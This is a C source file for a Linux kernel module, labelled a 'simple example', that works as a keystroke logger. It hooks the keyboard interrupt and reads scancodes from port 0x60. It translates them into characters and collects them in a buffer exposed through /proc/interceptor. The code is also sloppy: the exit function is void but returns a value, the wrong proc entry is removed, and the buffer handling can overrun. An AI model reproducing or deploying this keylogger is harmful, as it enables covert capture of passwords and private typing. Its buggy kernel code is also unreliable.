#include <linux/kernel.h> /* We're doing kernel work */
#include <linux/module.h> /* Specifically, a module */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h> /* We want an interrupt */
#include <linux/proc_fs.h>	/* Necessary because we use the proc fs */
#include <asm/io.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robert W. Oliver II");
MODULE_DESCRIPTION("A simple example Linux module.");
MODULE_VERSION("0.01");



int my_init(void);
void my_exit(void);
const char* translate_scan_code(int scancode);
ssize_t read_proc(struct file *filp,char *buf,size_t count,loff_t *offp);
static void work_handler(struct work_struct *work);

/*
 * Work queue stuff
 */
#define MY_WORK_QUEUE_NAME "Interceptor_Queue"

static struct workqueue_struct *my_workqueue;
 
struct interceptor_work_struct {
    struct work_struct work;
    unsigned char scancode;
};




/*
 * Interceptor buffer stuff
 */
#define  INTERCEPTOR_BUFFER_LEN 1000
int len,temp;
char *msg;
static char interceptor_buffer[INTERCEPTOR_BUFFER_LEN];
// unsigned int current_buffer_start_index = 0;
unsigned int current_buffer_size = 0;




/*
 * /proc stuff
 */
struct file_operations proc_fops = {
    read:   read_proc
};


// This is called when someone reads the proc file
/** @brief This function is called whenever device is being read from user space i.e. data is
 *  being sent from the device to the user. In this case is uses the copy_to_user() function to
 *  send the buffer string to the user and captures any errors.
 *  @param filep A pointer to a file object (defined in linux/fs.h)
 *  @param buffer The pointer to the buffer to which this function writes the data
 *  @param len Number of bytes attempted to be read
 *  @param offset Offset is where in the file is being read from
 */
ssize_t read_proc(struct file *filp,char *buf, size_t num_bytes_requested, loff_t *offp ) 
{
    printk("Count: %lu", num_bytes_requested);
    printk("Offset: %llu: ", *offp);
    unsigned int num_bytes_to_write = 0;

    if(num_bytes_requested < current_buffer_size)
    {
        num_bytes_to_write = num_bytes_requested;
    }
    else
    {
        num_bytes_to_write = current_buffer_size;
    }

    copy_to_user(buf, interceptor_buffer, num_bytes_to_write);

    current_buffer_size = 0; // We essentially flush the buffer on each read

    return num_bytes_to_write;
}




static void work_handler(struct work_struct *work_in)
{
    struct interceptor_work_struct* interceptor_work = (struct interceptor_work_struct *)work_in;
    printk("Worker called");

    // printk(KERN_INFO "Scan Code %x %s.\n",
    // (int)*((char *)scancode) & 0x7F,
    // *((char *)scancode) & 0x80 ? "Released" : "Pressed");

    unsigned char scancode = interceptor_work->scancode;
    const char* translated_character_str;

    printk("Worker handled scancode: %u", scancode);
    translated_character_str = translate_scan_code(scancode);
    printk("Translated scan code: %s", translated_character_str);

    if(translated_character_str == NULL)
    {
        printk("Translation is null");
    }
    else
    {
        if(current_buffer_size < INTERCEPTOR_BUFFER_LEN)
        {
            strncpy(interceptor_buffer + current_buffer_size, translated_character_str, INTERCEPTOR_BUFFER_LEN-current_buffer_size);
            current_buffer_size += strlen(translated_character_str);
        }
        else
        {
            printk("Flushing interceptor buffer!");
            current_buffer_size = 0;
                strncpy(interceptor_buffer + current_buffer_size, translated_character_str, INTERCEPTOR_BUFFER_LEN-current_buffer_size);
                current_buffer_size += strlen(translated_character_str);
        }
    }

    kfree(interceptor_work);
}


irqreturn_t irq_handler(int irq, void *dev_id)
{
    static unsigned char scancode;
    unsigned char status;
    

    printk("Interrupt caught");

    /*
    * Read keyboard status
    */
    status = inb(0x64);
    scancode = inb(0x60);

    // Not sure if this is the best way to do this?
    struct interceptor_work_struct * interceptor_work;
    interceptor_work = kmalloc(sizeof(struct interceptor_work_struct), GFP_ATOMIC);

    INIT_WORK(&interceptor_work->work, work_handler);

    interceptor_work->scancode = scancode;

    queue_work(my_workqueue, &interceptor_work->work);

    return IRQ_HANDLED;
}

/*
* Initialize the module - register the IRQ handler
*/
int my_init()
{
    my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);

    proc_create("interceptor",0,NULL,&proc_fops);
    
    // DISABLING FOR NOW
    // free_irq(1, NULL);
    return request_irq(1,           /* The number of the keyboard IRQ on PCs */
                       irq_handler, /* our handler */
                       IRQF_SHARED, "test_keyboard_irq_handler",
                       (void *)(irq_handler));
}

/*
* Cleanup
*/
void my_exit()
{
    /*
    * This is only here for completeness. It's totally irrelevant, since
    * we don't have a way to restore the normal keyboard interrupt so the
    * computer is completely useless and has to be rebooted.
    */
    // free_irq(1, NULL);

    remove_proc_entry("hello",NULL);

    return 0;
}

/*
* some work_queue related functions are just available to GPL licensed Modules
*/
MODULE_LICENSE("GPL");
module_init(my_init);
module_exit(my_exit);



const char* translate_scan_code(int scancode)
{
    static bool shift_is_pressed = false;

    /*
     * Shift down is 42
     * Shift up is 170
     * caps-lock down is 58
     * Caps-lock up is 186
     * Space is 57
     * "1" is 2
     * "2" is 3
     * "0" is 11
     * enter is 28
     54,182 is right shift down,up
     "\" is 43
     "F1" is 59
     "," is 51
     */

    if(scancode == 42 || scancode == 54)
    {
        shift_is_pressed = true;
        return NULL;
    }
    else if(scancode == 170 || scancode == 182)
    {
        shift_is_pressed = false;
        return NULL;
    }

    if(!shift_is_pressed)
    {
        switch(scancode)
        {
            case 41: return "`";
            case 2: return "1";
            case 3: return "2";
            case 4: return "3";
            case 5: return "4";
            case 6: return "5";
            case 7: return "6";
            case 8: return "7";
            case 9: return "8";
            case 10: return "9";
            case 11: return "0";
            case 12: return "-";
            case 13: return "=";
            case 14: return "<BACKSPACE>";
            case 15: return "<TAB>";

            case 16: return "q";
            case 17: return "w";
            case 18: return "e";
            case 19: return "r";
            case 20: return "t";
            case 21: return "y";
            case 22: return "u";
            case 23: return "i";
            case 24: return "o";
            case 25: return "p";
            case 26: return "[";
            case 27: return "]";
            case 43: return "\\";
            case 28: return "<ENTER>\n";
            //case 29: return "<LEFT_CTRL>";
            //case 56: return "<LEFT_ALT>";
            //case 224: return "<RIGHT_ALT>";


            case 30: return "a";
            case 31: return "s";
            case 32: return "d";
            case 33: return "f";
            case 34: return "g";
            case 35: return "h";
            case 36: return "j";
            case 37: return "k";
            case 38: return "l";
            case 39: return ";";
            case 40: return "'";

            case 44: return "z";
            case 45: return "x";
            case 46: return "c";
            case 47: return "v";
            case 48: return "b";
            case 49: return "n";
            case 50: return "m";
            case 51: return  ",";
            case 52: return  ".";
            case 53: return  "/";
            case 57: return " ";

            case 59: return "<F1>";
            case 60: return "<F2>";
            case 61: return "<F3>";
            case 62: return "<F4>";
            case 63: return "<F5>";
            case 64: return "<F6>";
            case 65: return "<F7>";
            case 66: return "<F8>";
            case 67: return "<F9>";
            case 68: return "<F10>";
            case 87: return "<F11>";
            case 88: return "<F12>";

            default: return NULL;
        }
    }
    else
    {
        switch(scancode)
        {
            case 41: return "~";
            case 2: return "!";
            case 3: return "@";
            case 4: return "#";
            case 5: return "$";
            case 6: return "%";
            case 7: return "^";
            case 8: return "&";
            case 9: return "*";
            case 10: return "(";
            case 11: return ")";
            case 12: return "_";
            case 13: return "+";
            case 14: return "<BACKSPACE>";
            case 15: return "<TAB>";

            case 16: return "Q";
            case 17: return "W";
            case 18: return "E";
            case 19: return "R";
            case 20: return "T";
            case 21: return "Y";
            case 22: return "U";
            case 23: return "I";
            case 24: return "O";
            case 25: return "P";
            case 26: return "{";
            case 27: return "}";
            case 43: return "|";
            case 28: return "<ENTER>\n";
            //case 29: return "<LEFT_CTRL>";


            case 30: return "A";
            case 31: return "S";
            case 32: return "D";
            case 33: return "F";
            case 34: return "G";
            case 35: return "H";
            case 36: return "J";
            case 37: return "K";
            case 38: return "L";
            case 39: return ":";
            case 40: return "\"";

            case 44: return "Z";
            case 45: return "X";
            case 46: return "C";
            case 47: return "V";
            case 48: return "B";
            case 49: return "N";
            case 50: return "M";
            case 51: return  "<";
            case 52: return  ">";
            case 53: return  "?";
            //case 56: return "<LEFT_ALT>";
            //case 224: return "<RIGHT_ALT>";
            case 57: return " ";

            case 59: return "<F1>";
            case 60: return "<F2>";
            case 61: return "<F3>";
            case 62: return "<F4>";
            case 63: return "<F5>";
            case 64: return "<F6>";
            case 65: return "<F7>";
            case 66: return "<F8>";
            case 67: return "<F9>";
            case 68: return "<F10>";
            case 87: return "<F11>";
            case 88: return "<F12>";

            default: return NULL;
        }
    }
}
